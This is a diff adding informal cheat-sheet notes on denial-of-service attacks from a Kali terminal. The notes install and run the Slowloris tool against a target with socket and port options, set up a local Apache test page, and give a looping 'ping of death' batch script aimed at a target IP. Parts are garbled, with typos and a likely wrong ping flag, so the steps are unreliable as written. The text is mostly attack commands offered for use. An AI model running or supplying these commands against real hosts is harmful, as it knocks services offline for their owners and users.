@@ -1,0 +1,77 @@
+open kali terminal
+----------------------------------
+sudo su
+----------------------------------
+browser open -  slowloris github
+https://github.com/gkbrk/slowloris  
+---------------------------------
+sudo pip3 install slowloris
+---------------------------------
+slowloris example.com/ip
+---------------------------------
+git clone https://github.com/gkbrk/slowloris.git
+---------------------------------
+cd slowloris
+--------------------------------
+python3 slowloris.py example.com
+--------------------------------
+sudo pip3 install PySocks
+--------------------------------
+slowloris.py
+--------------------------------
+pythons slowloris.py -s 500 -p 80 ip
+------------------------------------
+[-s socket,  -p port ]
+[and input socket came less then given, it means your 
+attack is working ]
+===================================
+======-============================
+install apache on kali [defalt in kali]
+----------------------------------
+if not 
+----------------------------------
+sudo apt install apache2
+---------------------------------
+service apache2 start
+---------------------------------
+firefox localhost
+---------------------------------
+sudo nano /var/www/html/index2.html
+---------------------------------
+sudo nano /var/www/html/index3.html
+----------------------------------
+<p> this is my website  </p>
+----------------------------------
+firefox localhost/index3.html
+----------------------------------
+
+
+
+
+
+
+===========================================
+==========================================
+==========================================
+
+- IT IS only capable on old devices / it can able to
+Crash old devices
+ping of death attack  is a kind of dos attack 
+in which we send big amounts of packets to the target. then packets size reached 
+out of capacity, then the system will be cashed.  
+
+attack syntax is -
+[write this syntax in notepad ] 
+------------------------
+:loop 
+ping [target device ip] -1 6500 -w 1 -n 1
+goto :loop
+------------------------
+save as 
+give file name as [pod.bat]
+and 
+all files 
+or save it on desktop
+--------------------------
+for start attack
+double tab over the file...
